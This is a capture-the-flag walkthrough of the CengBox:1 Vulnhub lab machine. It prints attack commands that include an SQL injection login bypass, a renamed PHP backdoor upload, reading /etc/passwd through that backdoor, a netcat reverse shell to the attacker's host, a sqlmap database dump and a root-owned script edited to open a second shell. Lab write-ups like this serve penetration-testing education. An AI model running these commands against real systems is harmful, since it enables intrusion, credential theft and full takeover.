# Cengbox:1 ~Vulnhub Walkthrough



### DISCRIPTION

- **Name**: CengBox: 1
- **Author**: [Arslan](https://www.vulnhub.com/author/arslan,693/)
- **Difficulty** : beginner/intermediate

There is a company that seems unreliable. You must think like a hacker and hack it easily. I think you do not need a hint but here are the nudges for you. For the user, you should understand how it works` and manipulate it. You might need everything that you’ll find. For root, wait a minute.

## Scanning

First we use nmap for port scanning and other information gathering on target host.

**nmap -p- IP_Address**

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled.png)

**nmap -sV -A Target_IP** (Service version scan)

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%201.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%201.png)

**nmap -sV -A --script vuln target_ip** (Vulnerability scanning using nmap) ****

```jsx
root@kali:~# nmap -sV -A --script vuln 192.168.122.150
Starting Nmap 7.70 ( https://nmap.org ) at 2020-06-25 11:04 EDT
Nmap scan report for 192.168.122.150
Host is up (0.00049s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:B6:14:F1 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 192.168.122.150

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 345.06 seconds
root@kali:~#
```

## Enumeration

Since port 80 is open, Let’s open target in Web Browser.

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%202.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%202.png)

Using gobuster to retrieve directories. using wordlist /usr/share/dirb/wordlists/big.txt

**gobuster -u [http://192.168.122.150/](http://192.168.122.150/) -w /usr/share/dirb/wordlists/big.txt -x php,txt**

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%203.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%203.png)

We got some directories like (uploads, Masteradmin, etc). After checking all the directories, we got an Error Page with the endpoint masteradmin/.

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%204.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%204.png)

Again using dirb to retrieve web pages from [http://192.168.122.150/masteradmin/](http://192.168.122.150/masteradmin/) 

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%205.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%205.png)

We found login.php page.

Running nikto on url [http://192.168.122.150/masteradmin/login.php](http://192.168.122.150/masteradmin/login.php) to find vulnerabilities

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%206.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%206.png)

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%207.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%207.png)

Nothing usefull found in nikto result.

## Exploitation

Let's open [http://192.168.122.150/masteradmin/login.php](http://192.168.122.150/masteradmin/login.php) in web browser.

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%208.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%208.png)

Trying SQL injection payload **' or 1=1 --** 

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%209.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%209.png)

We successfully bypass authentication.

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2010.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2010.png)

While Uploading shell.php file, its giving an error to upload file with CENG extension.

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2011.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2011.png)

We will change php to CENG 

**cp simple-backdoor.php backdoor.ceng**

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2012.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2012.png)

Uploading backdoor.ceng. Successfully uploaded

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2013.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2013.png)

Lets try to open it in web browser http://192.168.122.150/uploads/backdoor.ceng.

Its running successfully.

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2014.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2014.png)

[http://192.168.122.150/uploads/backdoor.ceng?cmd=cat](http://192.168.122.150/uploads/backdoor.ceng?cmd=cat) /etc/passwd

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2015.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2015.png)

We found one user cengover.

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2016.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2016.png)

Lets take reverse shell of target system.

**Start listening - nc -nlvp 5555**

**http://192.168.122.150/uploads/backdoor.ceng?cmd=nc -e /bin/bash 192.168.122.145 5555**

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2017.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2017.png)

***We got shell of  **www-data** user. 

Use python3 -c 'import pty;pty.spawn("/bin/bash")' for /bin/bash shell

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2018.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2018.png)

As this /masteradmin/login.php is vulnerable to sql injection. Let's run sqlmap tool.

**sqlmap -u [http://192.168.122.150/masteradmin/login.php](http://192.168.122.150/masteradmin/login.php) --forms --dbs --batch** 

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2019.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2019.png)

We found database cengbox

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2020.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2020.png)

**sqlmap -u [http://192.168.122.150/masteradmin/login.php](http://192.168.122.150/masteradmin/login.php) --forms -D --dump-all --batch =** To dumb database

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2021.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2021.png)

We found username masteradmin and password C3ng0v3R00T1!

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2022.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2022.png)

Lets try C3ng0v3R00T1! password to login user cengover of target system

su cengover

Password: C3ng0v3R00T1!

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2023.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2023.png)

We successfully logs in with cengover user.

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2024.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2024.png)

Found user.txt flag

## Privilege escalation

Let's see Background running process

**ps -aux**

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2025.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2025.png)

We found that process /opt/md5check.py is running in background by root privileges.

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2026.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2026.png)

Open md5check.py

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2027.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2027.png)

[md5check.py](http://md5check.py) is having write permission to other user. Let's edit this file and try to take reverse shell.

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2028.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2028.png)

Start netcat listener on port 4001 and after 30-40 second we have root shell of target machine.

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2029.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2029.png)

our challenge is complete we found our flag root.txt in /root directory.

![Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2030.png](Cengbox%201%20Vulnhub%20Walkthrough%203d648a0fc8a84bc2a035d4e0c5772352/Untitled%2030.png)
